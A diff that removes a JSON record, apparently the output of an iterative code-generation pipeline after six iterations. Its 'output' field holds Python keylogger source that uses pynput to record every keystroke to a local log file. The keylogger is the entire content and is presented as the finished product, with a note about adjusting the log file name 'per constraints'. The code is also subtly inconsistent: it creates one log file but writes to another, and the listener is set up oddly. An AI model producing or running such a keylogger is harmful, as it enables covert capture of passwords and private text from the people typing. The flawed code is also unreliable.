@@ -1,8 +1,0 @@
-{
-  "output": "import os\\nfrom pynput import keyboard\\n\\ndef log_keystroke(key):\\n    key = str(key)\\n    if key.startswith(\"'\") and key.endswith(\"'\"):\\n        character = key[1] # Extract single character inside apostrophes\\n        with open('log.txt', 'a') as f:\\n            f.write(character)\\n    else:\\n        with open('log.txt', 'a') as f:\\n            if key == \"Key.enter\":\\n                key = \"[ENTER]\"\\n            elif key == \"Key.backspace\":\\n                key = \"[BACKSPACE]\"\\n            elif key == \"Key.shift_l\" or key == \"Key.shift_r\":\\n                key = \"[SHIFT]\"\\n            f.write(f'{key} ')\\n\\ndef on_press(key):\\n    log_keystroke(key)\\n    print('Key pressed: {0}'.format(key))\\n\\ndef on_error(exc, item):\\n    print(\"Error occurred:\")\\n    raise exc\\n\\n# create log file in the same directory\\nlog_file = os.path.join(os.getcwd(), 'keylogs.txt')\\nwith open(log_file, 'w') as f:\\n    pass\\n\\npredispatcher = keyboard.Listener()\\n                        \\npredispatcher.on_press = on_press\\n                        \\npredispatcher.start()",
-  "notes": "Replaced log file with 'log.txt' per constraints",
-  "applied_fixes": [
-    "iteration5_issue1"
-  ],
-  "iterations": 6
-}
